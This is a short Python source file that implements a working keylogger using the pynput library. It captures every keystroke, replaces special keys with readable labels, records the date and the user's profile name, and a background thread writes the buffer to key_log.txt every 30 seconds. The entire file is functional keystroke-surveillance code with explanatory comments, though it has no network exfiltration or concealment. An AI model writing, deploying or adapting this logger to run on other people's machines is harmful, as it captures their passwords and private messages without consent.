from pynput.keyboard import Key, Listener
import time
import os
import threading

# Save current datetime and user
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split("/")[-1]

# List to substitute special keys.
substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ', 'Key.alt', '[ALT]',
	            'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 'Key.alt_r', '[ALT]',
	            'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
	            '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
	            '[SUPER]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

# Initializing title and logs
title = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n\n'
logs = [title]

# Key press callback which is called each time a key is pressed.
def on_press(key):
    key = str(key).strip('\'')

    # Check if its a special key and then substitute it accordingly.
    if key in substitution:
        logs.append(substitution[substitution.index(key)+1])
    else:
        logs.append(key)


def save_log():
    while True:
        # Wait every 30 seconds to save logs in a file.
        time.sleep(30)
        if len(logs) > 1:
            # save logs in key_log.txt in append mode.
            with open('key_log.txt', 'a') as f:
                f.write(''.join(logs))

                # Clear logs after saving them.
                logs.clear()

                # Reinitialize log for newer key strokes.
                datetime = time.ctime(time.time())
                logs.append(f'\n\n *~ Date/Time: {datetime}\n\n')

if __name__ == "__main__":

    # Create a separate thread that saves the log.
    logThread = threading.Thread(target=save_log)
    logThread.start()

    # Thread to listen to key strokes.
    with Listener(on_press=on_press) as listener:
        listener.join()
